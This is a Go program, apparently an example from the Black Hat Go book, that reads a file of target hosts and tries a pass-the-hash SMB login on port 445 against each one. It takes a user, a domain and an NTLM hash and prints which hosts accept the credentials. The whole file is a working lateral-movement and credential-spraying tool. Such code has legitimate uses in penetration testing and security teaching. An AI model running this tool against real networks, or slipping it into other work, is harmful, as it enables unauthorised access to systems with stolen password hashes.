package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"

	smb "github.com/blackhat-go/bhg/ch-6/smb/smb"
	log "github.com/sirupsen/logrus"
)

func main() {
	if len(os.Args) != 5 {
		log.Fatalln("Usage: go run main.go <target/hosts> <user> <domain> <hash>")
	}

	buf, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatalln(err)
	}

	options := smb.Options{
		User:   os.Args[2],
		Domain: os.Args[3],
		Hash:   os.Args[4],
		Port:   445,
	}

	targets := bytes.Split(buf, []byte{'\n'})
	for _, target := range targets {
		cleanTarget := bytes.TrimSpace(target)
		if len(cleanTarget) == 0 {
			continue
		}

		options.Host = string(cleanTarget)
		session, err := smb.NewSession(options, false)
		if err != nil {
			fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)
			continue
		}

		if session.IsAuthenticated {
			fmt.Printf("[+] Login successful [%s]\n", options.Host)
		}
		session.Close()
	}
}
